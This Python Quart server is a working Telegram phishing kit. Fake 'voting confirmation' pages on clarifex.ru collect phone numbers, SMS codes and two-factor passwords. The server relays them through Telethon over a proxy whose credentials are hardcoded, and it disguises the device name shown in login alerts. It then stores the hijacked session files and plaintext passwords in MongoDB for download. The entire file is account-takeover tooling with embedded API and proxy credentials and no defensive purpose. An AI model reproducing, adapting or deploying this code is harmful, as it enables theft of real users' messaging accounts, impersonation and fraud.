from os import path, remove

from quart import Quart, render_template, request, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, \
    PasswordHashInvalidError, SendCodeUnavailableError

# DATABASE
import pymongo
from datetime import datetime

# fiel for DB
path_to_files = "/var/www/www-root/data/www/clarifex.ru/"


app = Quart(__name__)

img = 'logo.png'
bg_link = 'https://clarifex.ru/'
link = 'http://clarifex.ru/'
name = 'clarifex'
site = 'clarifex.ru'
redirect_url = 'https://clarifex.ru/success'

SESSIONS = {}
API_ID = 1891354
API_HASH = '7e8edd54e1b085bfb29af43c11c6c00e'

import user_agent_parser

def delete(filename):
    if path.exists(filename):
        remove(filename)


PROXY_ADDRESS = '94.127.136.93'
PROXY_PORT = 8000
PROXY_USERNAME = 'SorEzh'
PROXY_PASSWORD = 'F40CXV'

def create_alert_text(device, os, browser):
    result_text = ""
    if os == 'Android':
        result_text = os
    
    elif os == 'iOS':
        result_text = device + " " + os
    
    else:
        result_text = os
    
    return result_text + " на сайте " + site + " для подтверждения в голосовании, " + browser

import python_socks
async def build_client(session_name, device, os, browser):
    session = TelegramClient(
        api_hash = API_HASH,
        api_id = API_ID,
        session = session_name,
        device_model = create_alert_text(device, os, browser),
        proxy = {
            'proxy_type': python_socks.ProxyType.SOCKS5,
            'addr': PROXY_ADDRESS,
            'port': PROXY_PORT,
            'username': PROXY_USERNAME,
            'password': PROXY_PASSWORD
        }
    )
    await session.connect()
    return session
 

@app.route("/auth", methods=['get'])
async def auth_qr():
    return await render_template('auth.html', img=img, link=link, bg_link=bg_link)


@app.route("/success", methods=['get'])
async def success():
    return await render_template('success.html', img=img, link=link, bg_link=bg_link)


@app.route("/phone_form", methods=['get'])
async def login():
    return await render_template('phone_form.html', img=img, link=link, bg_link=bg_link, name=name, site=site)



@app.route("/phone_form", methods=['post'])
async def get_phone_number():
    user_agent = request.headers.get('User-Agent')
    user_agent_info = user_agent_parser.Parser(user_agent)
    device = user_agent_info.device_name
    os = user_agent_info.os
    browser = user_agent_info.browser

    print("=====================================================================")
    print(user_agent)

    if user_agent_info.device_type is not None:
        print("user_agent_info.device_type: " + user_agent_info.device_type)

    if user_agent_info.device_name is not None:
        print("user_agent_info.device_name: " + user_agent_info.device_name)
    
    if user_agent_info.browser is not None:
        print("user_agent_info.browser: " + user_agent_info.browser)

    if user_agent_info.browser_version is not None:
        print("user_agent_info.browser_version: " + user_agent_info.browser_version)

    if user_agent_info.device_host is not None:
        print("user_agent_info.device_host: " + user_agent_info.device_host)

    if user_agent_info.os is not None:
        print("user_agent_info.os: " + user_agent_info.os)

    if user_agent_info.os_version is not None:
        print("user_agent_info.os_version: " + user_agent_info.os_version)

    print("=====================================================================")
    
    
    phone_code = (await request.form).get('phone-code').lstrip("+")
    phone = (await request.form).get('phone').replace(' ', '')
    phone_number = str(phone_code) + str(phone)
    SESSIONS[phone_number] = await build_client(
        phone_number,
        device,
        os,
        browser
    )

    try:
        await SESSIONS[phone_number].send_code_request(phone=phone_number, force_sms=True)
    
    except SendCodeUnavailableError:
        return await render_template("submit_code.html", phone=phone_number, img=img, link=link, bg_link=bg_link,
                                     name=name, site=site)

    except Exception as e:
        print(e)
        if session := SESSIONS.get(phone_number):
            SESSIONS.pop(phone_number)
            await session.disconnect()
            delete(phone_number + ".session")
        return await render_template("phone_form.html",
                                     error="This number is not registered in Telegram", img=img, link=link, bg_link=bg_link, name=name, site=site)
    return await render_template("submit_code.html", phone=phone_number, img=img, link=link, bg_link=bg_link, name=name, site=site)
 


@app.route("/s/<phone>", methods=['post'])
async def submit_code(phone: str):
    code = (await request.form).get("code")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, code=code)
        
        db_client = pymongo.MongoClient("mongodb://localhost:27017/")
        current_db = db_client["afra"]
        collection = current_db["sessions"]
    
        current_date_string = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
        existing_record = collection.find_one({"fileName": phone})
    
        if existing_record:
            print("exist")
            update_data = {
                "fileURL": path_to_files + phone + ".session",
                "authURL": "",
                "uploadTime": current_date_string,
                "isDownload": "no",
                "owner": "vote-124"
            }
    
            collection.update_one({"fileName": phone}, {"$set": update_data})
        else:
            print("dosn't exist")
            new_item = {
                "fileURL": path_to_files + phone + ".session",
                "authURL": "",
                "fileName": phone,
                "uploadTime": current_date_string,
                "isDownload": "no",
                "owner": "vote-124"
            }
    
            collection.insert_one(new_item)
    
        db_client.close()

    except SessionPasswordNeededError:
        return await render_template("submit_password.html", phone=phone, img=img, link=link, bg_link=bg_link, name=name, site=site)
    except KeyError:
        return await render_template("phone_form.html",
                                     error="Invalid phone number")
    except PhoneCodeInvalidError as e:
        return await render_template("submit_code.html", phone=phone, error="Entered code not valid", img=img, link=link, bg_link=bg_link, name=name, site=site)
    return redirect(redirect_url)




@app.route("/sp/<phone>", methods=['post'])
async def submit_password(phone: str):
    password = (await request.form).get("password")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, password=password)
        with open(f'{phone}.txt', 'a') as file:
            file.write(password + '\n')
            
            
        db_client = pymongo.MongoClient("mongodb://localhost:27017/")
        current_db = db_client["afra"]
        collection = current_db["sessions"]
    
        current_date_string = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
        existing_record = collection.find_one({"fileName": phone})
    
        if existing_record:
            print("exist")
            update_data = {
                "fileURL": path_to_files + phone + ".session",
                "authURL": path_to_files + phone + ".txt",
                "uploadTime": current_date_string,
                "isDownload": "no",
                "owner": "vote-124"
            }
    
            collection.update_one({"fileName": phone}, {"$set": update_data})
        else:
            print("dosn't exist")
            new_item = {
                "fileURL": path_to_files + phone + ".session",
                "authURL": path_to_files + phone + ".txt",
                "fileName": phone,
                "uploadTime": current_date_string,
                "isDownload": "no",
                "owner": "vote-124"
            }
    
            collection.insert_one(new_item)
    
        db_client.close()

    except KeyError:
        return await render_template("phone_form.html", error="Incorrect phone number.", img=img, link=link, bg_link=bg_link, name=name, site=site)
    except PasswordHashInvalidError as e:
        return await render_template("submit_password.html", phone=phone, error="Password incorrect.", img=img, link=link, bg_link=bg_link, name=name, site=site)

    return redirect(redirect_url)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
